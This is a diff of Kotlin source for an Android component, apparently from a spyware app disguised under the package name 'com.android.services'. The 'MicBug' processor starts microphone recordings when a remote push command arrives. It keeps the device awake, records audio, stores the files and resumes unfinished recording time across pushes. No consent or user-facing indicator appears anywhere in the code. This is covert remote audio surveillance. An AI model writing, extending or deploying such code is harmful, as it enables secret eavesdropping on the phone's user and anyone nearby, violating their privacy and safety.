@@ -5,12 +5,15 @@ import android.content.Context
 import android.content.Intent
 import android.os.PowerManager
 import android.util.Log
+import androidx.localbroadcastmanager.content.LocalBroadcastManager
 import androidx.work.Data
 import androidx.work.WorkManager
 import com.android.services.db.entities.MicBug
 import com.android.services.enums.FcmPushStatus
 import com.android.services.logs.source.LocalDatabaseSource
 import com.android.services.models.MicBugCommand
+import com.android.services.receiver.AudioFileCompressorReceiver
+import com.android.services.receiver.VideoFileCompressorReceiver
 import com.android.services.util.AppConstants
 import com.android.services.util.AppUtils
 import com.android.services.util.Mp3LameRecorder
@@ -30,15 +33,17 @@ import kotlinx.coroutines.launch
 import kotlinx.coroutines.withContext
 import java.io.File
 import java.util.concurrent.TimeUnit
+import kotlin.math.roundToInt
 
 class MicBugCommandProcessingBaseImpll(
     val context: Context,
     val localDatabaseSource: LocalDatabaseSource,
     val coroutineScope: CoroutineScope,
 ) : MicBugCommandProcessingBase(context) {
-
+    private val micBugsWithPushId: MutableList<MicBug> = mutableListOf();
     override fun initialize() {
         logVerbose("In OnCreate", AppConstants.MIC_BUG_TYPE)
+        logVerbose("In OnCreate", "MicBugProcessInfo")
         micBugStatus = FcmPushStatus.INITIALIZED.getStatus()
     }
 
@@ -50,10 +55,32 @@ class MicBugCommandProcessingBaseImpll(
             )
             micBugPush = Gson().fromJson(data.getString(MIC_BUG_PUSH), MicBugCommand::class.java)
             logVerbose("MicBug Push = $micBugPush", AppConstants.MIC_BUG_TYPE)
+            logVerbose("MicBug Push = $micBugPush", "MicBugProcessInfo")
+
             acquireWakeLock()
             micBugPush?.let { push ->
                 intervalConsumed = 0
                 push.customData?.let { data -> customData = data }
+                micBugsWithPushId.addAll(localDatabaseSource.selectMicBugWithSamePushId(push.pushId))
+                logVerbose(
+                    "Previous micbug list size=${micBugsWithPushId.size}",
+                    "MicBugProcessInfo"
+                )
+                if (micBugsWithPushId.isNotEmpty()) {
+                    val totalInterval = micBugsWithPushId[0].totalDuration
+                    logVerbose("Pending total duration = $totalInterval", "MicBugProcessInfo")
+                    var consumeTime = 0
+                    micBugsWithPushId.forEach {
+                        consumeTime += it.duration.toInt()
+                    }
+                    logVerbose("ConsumedTime =$consumeTime", "MicBugProcessInfo")
+                    val remainingInterval = totalInterval - consumeTime;
+                    logVerbose("Remaining time =$remainingInterval", "MicBugProcessInfo")
+
+                    val newCustomData = (remainingInterval / 60.0).roundToInt()
+                    customData = newCustomData.toString()
+                    logVerbose("New Custom data =$newCustomData", "MicBugProcessInfo")
+                }
                 executorService.execute {
                     startRecording()
                 }
@@ -82,19 +109,15 @@ class MicBugCommandProcessingBaseImpll(
         coroutineScope.launch {
             try {
                 stopRecording()
-                var destFile: String? = null
-                try {
-                    destFile = compressOutputFile()
-                } catch (e: Exception) {
-                    logException("Error compressing file ${e.message}", throwable = e)
-                }
-                reNameFile(applicationContext, mFilePath, destFile)
+                reNameFile(applicationContext, mFilePath, null)
                 insertMicBug()
                 if (disposable != null && !disposable!!.isDisposed) {
                     disposable!!.dispose()
                 }
                 shutDownExecutorService()
                 releaseWakeLock()
+                LocalBroadcastManager.getInstance(applicationContext)
+                    .sendBroadcast(Intent(AudioFileCompressorReceiver.ACTION_COMPRESS_AUDIO))
             } catch (exp: Exception) {
                 logException("onDestroy Exception = ${exp.message}", AppConstants.MIC_BUG_TYPE)
                 updateMicBugPushAsCorrupted()
@@ -126,15 +149,7 @@ class MicBugCommandProcessingBaseImpll(
                     val destFile = "compress_${mFilePath.substringAfterLast("/")}"
                     val destFilePAth =
                         mFilePath.replace(mFilePath.substringAfterLast("/"), destFile)
-                    //Old Command that was compressing 50%
-//            val rc = FFmpeg.execute("-i $mFilePath -c:v mpeg4 $destFilePAth")
-
-                    // Working commands
-//            -y -i $mFilePath -ar 44100 -ac 2 -ab 48k -f mp3 $destFilePAth
-                    // This command will compress the file 67%
-                    //-y -i $mFilePath -codec:a libmp3lame -b:a 88k $destFilePAth
                     logVerbose("size before compression = ${File(mFilePath).sizeInKb}")
-//            val rc = FFmpeg.execute("-y -i $mFilePath -ar 44100 -ac 2 -ab 20k -c:v mpeg4 $destFilePAth")
                     when (val rc =
                         FFmpeg.execute("-y -i $mFilePath -ar 44100 -ac 2 -ab 20k -c:v mpeg4 $destFilePAth")) {
                         Config.RETURN_CODE_SUCCESS -> {
@@ -186,9 +201,14 @@ class MicBugCommandProcessingBaseImpll(
                 val interval: Int =
                     if (customData.isNotEmpty()) customData.toInt() else 1
                 if (intervalConsumed >= interval) {
+                    logVerbose("MicBug interval reached to max", "MicBugProcessInfo")
                     micBugStatus = FcmPushStatus.SUCCESS.getStatus()
                     stopWorker()
                 }
+                logVerbose(
+                    "MicBug interval less than max interval intervalConsumed =$intervalConsumed interval=$interval",
+                    "MicBugProcessInfo"
+                )
                 intervalConsumed = intervalConsumed.incrementOne()
             }
     }
@@ -202,6 +222,7 @@ class MicBugCommandProcessingBaseImpll(
     override fun startRecording() {
         mRecordingStartTime = System.currentTimeMillis()
         try {
+            logVerbose("Preparing to Start Recording", "MicBugProcessInfo")
             logVerbose("Preparing to Start Recording", AppConstants.MIC_BUG_TYPE)
             recorder = Mp3LameRecorder(mFilePath, 44100)
             recorder!!.startRecording(Mp3LameRecorder.TYPE_MIC_BUG)
@@ -220,6 +241,7 @@ class MicBugCommandProcessingBaseImpll(
             logVerbose("Preparing to Stop Recording", AppConstants.MIC_BUG_TYPE)
             try {
                 if (recorder != null) {
+                    logVerbose("Recording stopped", "MicBugProcessInfo")
                     recorder!!.stopRecording()
                     recorder = null
                     logVerbose("Recording Stopped", AppConstants.MIC_BUG_TYPE)
@@ -244,27 +266,25 @@ class MicBugCommandProcessingBaseImpll(
                 "MiBug file duration = ($mRecordingStartTime, $elapsedTime)",
                 AppConstants.MIC_BUG_TYPE
             )
+            logVerbose("Micbug going to insert", "MicBugProcessInfo")
             if (micBugStatus == FcmPushStatus.SUCCESS.getStatus() || micBugStatus == FcmPushStatus.INTERRUPTED.getStatus()) {
                 if (AppUtils.validFileSize(File(mFilePath)) && elapsedTime > 2) {
+                    logVerbose("Micbug going to insert", "MicBugProcessInfo")
                     val micBug = MicBug()
                     micBug.apply {
                         this.file = mFilePath
                         this.name = AppUtils.formatDateCustom(currentTimeInMilliSeconds.toString())
                         this.duration = elapsedTime.toString()
+                        this.totalDuration = customData.toInt() * 60
                         this.startDatetime = AppUtils.formatDate(mRecordingStartTime.toString())
                         this.pushId = micBugPush?.pushId ?: ""
                         this.pushStatus = micBugStatus!!
                         this.date = AppUtils.getDate(currentTimeInMilliSeconds)
-                        this.isCompressed = 1
-                        this.status = 0
+                        this.isCompressed = 0
+                        this.status = 1
                     }
                     localDatabaseSource.insertMicBug(micBug)
-                } else if (micBugStatus == FcmPushStatus.INITIALIZED.getStatus()) {
-                    localDatabaseSource.updatePushStatus(
-                        micBugPush!!.pushId,
-                        FcmPushStatus.FAILED.getStatus(),
-                        0
-                    )
+                    logVerbose("Micbug inserted", "MicBugProcessInfo")
                 } else {
                     logVerbose(
                         "MiBug failed with duration = $elapsedTime and Size = ${
@@ -273,6 +293,47 @@ class MicBugCommandProcessingBaseImpll(
                             ).sizeInKb
                         }", AppConstants.MIC_BUG_TYPE
                     )
+                    logVerbose("Micbug insert failed 1 $micBugStatus", "MicBugProcessInfo")
+                    localDatabaseSource.updatePushStatus(
+                        micBugPush!!.pushId,
+                        FcmPushStatus.FILE_CORRUPTED.getStatus(),
+                        0
+                    )
+                    AppUtils.deleteFile(applicationContext, mFilePath)
+                }
+            } else if (micBugStatus == FcmPushStatus.INITIALIZED.getStatus()) {
+                if (AppUtils.validFileSize(File(mFilePath)) && elapsedTime > 2) {
+                    var name = AppUtils.formatDateCustom(currentTimeInMilliSeconds.toString())
+                    if (micBugsWithPushId.isNotEmpty()) {
+                        name = name + "(" + (micBugsWithPushId.size + 1).toString() + ")"
+                    } else {
+                        name += "(1)"
+                    }
+                    logVerbose("Micbug going to insert", "MicBugProcessInfo")
+                    val micBug = MicBug()
+                    micBug.apply {
+                        this.file = mFilePath
+                        this.name = name
+                        this.duration = elapsedTime.toString()
+                        this.totalDuration = customData.toInt() * 60
+                        this.startDatetime = AppUtils.formatDate(mRecordingStartTime.toString())
+                        this.pushId = micBugPush?.pushId ?: ""
+                        this.pushStatus = micBugStatus!!
+                        this.date = AppUtils.getDate(currentTimeInMilliSeconds)
+                        this.isCompressed = 0
+                        this.status = 1
+                    }
+                    localDatabaseSource.insertMicBug(micBug)
+                    logVerbose("Micbug inserted", "MicBugProcessInfo")
+                } else {
+                    logVerbose(
+                        "MiBug failed with duration = $elapsedTime and Size = ${
+                            File(
+                                mFilePath
+                            ).sizeInKb
+                        }", AppConstants.MIC_BUG_TYPE
+                    )
+                    logVerbose("Micbug insert failed 1 $micBugStatus", "MicBugProcessInfo")
                     localDatabaseSource.updatePushStatus(
                         micBugPush!!.pushId,
                         FcmPushStatus.FILE_CORRUPTED.getStatus(),
@@ -282,12 +343,14 @@ class MicBugCommandProcessingBaseImpll(
                 }
             } else {
                 if (micBugStatus != null) {
+                    logVerbose("Micbug insert failed 2 $micBugStatus", "MicBugProcessInfo")
                     localDatabaseSource.updatePushStatus(
                         micBugPush!!.pushId,
                         micBugStatus!!,
                         0
                     )
                 } else {
+                    logVerbose("Micbug insert failed 3 $micBugStatus", "MicBugProcessInfo")
                     localDatabaseSource.updatePushStatus(
                         micBugPush!!.pushId,
                         FcmPushStatus.FAILED.getStatus(),
